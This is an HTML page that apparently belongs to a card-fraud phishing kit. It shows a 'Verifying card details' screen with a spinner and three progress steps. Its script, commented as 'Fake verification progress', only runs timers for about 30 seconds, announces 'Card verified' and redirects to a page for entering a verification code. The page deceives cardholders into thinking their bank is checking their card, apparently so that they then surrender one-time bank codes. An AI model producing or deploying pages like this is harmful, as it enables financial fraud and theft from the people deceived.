<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifying Card</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  font-family: 'Outfit', system-ui, sans-serif;
  background: #05050a;
  min-height: 100vh;
  color: #f0f0f5;
}

.bg {
  position: fixed;
  inset: 0;
  z-index: 0;
  background:
    radial-gradient(ellipse at 30% 20%, rgba(124, 58, 237, 0.22) 0%, transparent 50%),
    radial-gradient(ellipse at 70% 80%, rgba(219, 39, 119, 0.18) 0%, transparent 45%),
    #05050a;
}

.page {
  position: relative;
  z-index: 1;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 32px 20px;
}

.card {
  width: 100%;
  max-width: 400px;
  background: rgba(18, 18, 28, 0.8);
  backdrop-filter: blur(24px);
  -webkit-backdrop-filter: blur(24px);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 24px;
  padding: 48px 28px 40px;
  box-shadow: 0 25px 60px rgba(0, 0, 0, 0.45);
  text-align: center;
}

/* Spinner */
.spinner {
  width: 56px;
  height: 56px;
  margin: 0 auto 24px;
  border: 3px solid rgba(167, 139, 250, 0.2);
  border-top-color: #a78bfa;
  border-radius: 50%;
  animation: spin 0.85s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

h1 {
  font-size: 1.3rem;
  font-weight: 600;
  margin-bottom: 10px;
}

.sub {
  font-size: 0.92rem;
  color: #9a9ab0;
  line-height: 1.5;
  margin-bottom: 28px;
}

/* Progress steps */
.steps {
  text-align: left;
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.step {
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 0.88rem;
  color: #6b6b80;
  padding: 10px 12px;
  border-radius: 10px;
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.05);
  transition: color 0.3s, border-color 0.3s, background 0.3s;
}

.step.active {
  color: #e0e0f0;
  border-color: rgba(167, 139, 250, 0.3);
  background: rgba(167, 139, 250, 0.08);
}

.step.done {
  color: #86efac;
  border-color: rgba(34, 197, 94, 0.25);
  background: rgba(34, 197, 94, 0.08);
}

.step-icon {
  width: 22px;
  height: 22px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.7rem;
  flex-shrink: 0;
  background: rgba(255, 255, 255, 0.06);
}

.step.active .step-icon {
  background: rgba(167, 139, 250, 0.3);
}

.step.done .step-icon {
  background: rgba(34, 197, 94, 0.25);
}

.note {
  margin-top: 24px;
  font-size: 0.78rem;
  color: #6b6b80;
}
</style>
</head>
<body>

<div class="bg"></div>

<div class="page">
  <div class="card">
    <div class="spinner" id="spinner"></div>
    <h1 id="title">Verifying card details</h1>
    <p class="sub" id="sub">Please wait while we check your card with the issuer…</p>

    <div class="steps">
      <div class="step active" id="s1">
        <span class="step-icon">1</span>
        Checking card number
      </div>
      <div class="step" id="s2">
        <span class="step-icon">2</span>
        Validating expiry &amp; CVV
      </div>
      <div class="step" id="s3">
        <span class="step-icon">3</span>
        Contacting your bank
      </div>
    </div>

    <p class="note">Do not close this window</p>
  </div>
</div>

<script>
  // Fake verification progress, then go to code page
  // Total wait ~30 seconds before going to code page
  const steps = [
    { id: 's1', delay: 8000 },
    { id: 's2', delay: 16000 },
    { id: 's3', delay: 24000 }
  ];

  steps.forEach((s, i) => {
    setTimeout(() => {
      if (i > 0) {
        const prev = document.getElementById(steps[i - 1].id);
        prev.classList.remove('active');
        prev.classList.add('done');
        prev.querySelector('.step-icon').textContent = '✓';
      }
      document.getElementById(s.id).classList.add('active');
    }, s.delay);
  });

  // Finish at 30s → redirect to verification code page
  setTimeout(() => {
    const last = document.getElementById('s3');
    last.classList.remove('active');
    last.classList.add('done');
    last.querySelector('.step-icon').textContent = '✓';

    document.getElementById('title').textContent = 'Card verified';
    document.getElementById('sub').textContent = 'Redirecting to enter your verification code…';
    document.getElementById('spinner').style.borderTopColor = '#86efac';

    setTimeout(() => {
      window.location.href = '/verify.html';
    }, 1500);
  }, 30000);
</script>

</body>
</html>
